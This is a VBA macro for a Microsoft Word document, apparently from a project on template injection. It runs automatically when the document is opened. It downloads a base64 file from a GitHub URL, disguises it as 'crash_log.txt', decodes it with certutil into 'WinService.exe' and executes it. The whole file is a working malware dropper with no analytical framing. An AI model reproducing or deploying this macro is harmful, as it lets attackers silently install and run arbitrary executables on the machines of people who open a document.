Option Explicit

#If VBA7 Then
   Private Declare Function URLDownloadToFile Lib "urlmon" Alias _
     "URLDownloadToFileA" (ByVal pCaller As LongPtr, ByVal szURL As String, ByVal _
       szFileName As String, ByVal dwReserved As LongPtr, ByVal lpfnCB As LongPtr) As LongPtr
    Private Declare PtrSafe Sub Sleep Lib "kernel32" (ByVal Milliseconds As LongPtr)
       
#Else
   Private Declare Function URLDownloadToFile Lib "urlmon" Alias _
     "URLDownloadToFileA" (ByVal pCaller As Long, ByVal szURL As String, ByVal _
       szFileName As String, ByVal dwReserved As Long, ByVal lpfnCB As Long) As Long
    Private Declare PtrSafe Sub Sleep Lib "kernel32" (ByVal Milliseconds As Long)
#End If

Sub download_file(LocalFilePath As String)

Dim downloadStatus As Variant
Dim url As String

url = "https://raw.githubusercontent.com/orgurar/ms-template-injection/master/data/WinService.txt"

' download base64 file to local disk
downloadStatus = URLDownloadToFile(0, url, LocalFilePath, 0, 0)

End Sub

Sub Document_Open()

Dim LocalFilePath As String
Dim LocalExePath As String

' get current directory and add txt and exe file
LocalFilePath = CurDir & "\crash_log.txt"
LocalExePath = CurDir & "\WinService.exe"

' downloading base64 txt file (exe)
Call download_file(LocalFilePath)

' convert base64 back to exe using certutil and then run the process
Shell ("certutil -decode " & LocalFilePath & " " & LocalExePath)
Sleep (1000)

Shell (LocalExePath)

End Sub
